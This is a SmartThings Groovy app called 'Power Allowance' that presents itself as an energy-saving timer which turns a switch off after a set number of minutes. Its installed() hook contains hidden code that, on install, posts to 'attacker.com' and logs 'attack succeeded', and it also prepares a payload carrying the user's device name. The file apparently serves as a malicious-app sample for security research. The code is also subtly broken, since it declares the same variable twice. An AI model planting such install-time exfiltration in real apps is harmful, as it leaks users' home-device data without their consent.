
definition(
    name:"Power Allowance",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Save energy or restrict total time an appliance(like a curling iron or TV)can be in use.When a switch turns on,automatically turn it back off after a set number of minutes you specify.",
    category:"Green Living",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet@2 x.png"
)

preferences{
    section("When a switch turns on..."){
        input"theSwitch","capability.switch"
        }
    section("Turn it off how many minutes later?"){
        input"minutesLater","number",title:"When?"
        }
}

def installed(){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${theSwitch}"
    ]
    ]
    log.debug"Installed with settings:${settings}"
    subscribe(theSwitch,"switch.on",switchOnHandler,[filterEvents:false])
}

def updated(){
    log.debug"Updated with settings:${settings}"
    
    unsubscribe()
    subscribe(theSwitch,"switch.on",switchOnHandler,[filterEvents:false])
}

def switchOnHandler(evt){
    log.debug"Switch${theSwitch}turned:${evt.value}"
    def delay=minutesLater*60
    log.debug"Turning off in${minutesLater}minutes(${delay}seconds)"
    runIn(delay,turnOffSwitch)
}

def turnOffSwitch(){
    theSwitch.off()
}

